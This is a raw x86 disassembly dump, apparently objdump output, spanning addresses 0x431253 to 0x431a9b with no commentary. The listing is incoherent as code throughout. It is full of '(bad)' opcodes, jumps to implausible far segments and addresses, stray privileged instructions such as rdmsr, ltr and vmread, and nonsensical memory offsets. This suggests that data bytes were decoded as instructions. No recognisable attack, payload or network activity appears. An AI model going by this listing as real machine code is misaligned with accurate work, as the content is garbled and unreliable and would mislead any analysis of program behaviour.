  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
